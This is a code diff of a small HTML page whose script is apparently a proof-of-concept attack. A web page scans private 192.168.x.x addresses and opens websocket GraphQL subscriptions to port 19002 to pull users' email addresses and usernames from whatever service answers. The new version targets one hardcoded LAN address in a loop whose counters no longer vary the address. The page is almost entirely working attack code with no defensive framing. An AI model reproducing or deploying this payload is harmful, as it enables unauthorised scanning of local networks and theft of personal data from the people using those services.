@@ -6,66 +6,52 @@
 <body>
   <ul id="mainList"></ul>
 <script> 
-(async ()=>{
-for(let i = 0; i < 2; i++){//256
-for(let j = 0; j < 256; j++){
-try{
-const client = new window.SubscriptionsTransportWs.SubscriptionClient(`ws://192.168.${i}.${j}:19002/graphql`, {
-  reconnect: true
-});
-((client)=>{
-client.subscribe(
-    {
-  query: `
-  {
-    userSettings {
-      id
-      sendTo
+(async () => {
+    for (let i = 0; i < 2; i++) { //256
+        for (let j = 0; j < 256; j++) {
+            const client = new window.SubscriptionsTransportWs.SubscriptionClient(`ws://192.168.${1}.${76}:19002/graphql`, {
+                //   reconnect: true
+            });
+            ((client) => {
+                client.subscribe({
+                    query: `
+                                    {
+                                        userSettings {
+                                        id
+                                        sendTo
+                                        }
+                                    }
+                                    `
+                }, (err, data, subClient = client) => {
+                    if (data) {
+                        const item = document.createElement("li");
+                        item.innerHTML = `Email: ${data.userSettings.sendTo}`;
+                        document.getElementById("mainList").appendChild(item);
+                        client.subscribe({
+                            query: `
+                                            {
+                                                user {
+                                                username
+                                                }
+                                            }
+                                            `
+                        }, (err, data, subClient = client) => {
+                            if (data) {
+                                const item = document.createElement("li");
+                                item.innerHTML = `Username: ${data.user.username}`;
+                                document.getElementById("mainList").appendChild(item);
+                            } else if (err) {
+                                subClient.close();
+                            }
+                        });
+                    } else if (err) {
+                        subClient.close();
+                    }
+                });
+            })(client);
+            await new Promise(resolve => setTimeout(resolve, 10));
+        }
     }
-  }
-  `
-    }
-,(err,data,subClient=client)=>
-  {
-if(data){
-const item = document.createElement("li");
-item.innerHTML = `Email: ${data.userSettings.sendTo}`;
-document.getElementById("mainList").appendChild(item);
-}
-else if(err){
-subClient.close();
-}
-  }
-);
-client.subscribe(
-    {
-  query: `
-  {
-    user {
-      username
-    }
-  }
-  `
-    }
-,(err,data,subClient=client)=>
-  {
-if(data){
-const item = document.createElement("li");
-item.innerHTML = `Username: ${data.user.username}`;
-document.getElementById("mainList").appendChild(item);
-}
-else if(err){
-subClient.close();
-}
-  }
-);
-})(client);
-}
-catch(e){
-}
-await new Promise(resolve => setTimeout(resolve, 10));
-}
-}
-  })();
+})();
 </script>
 </body>
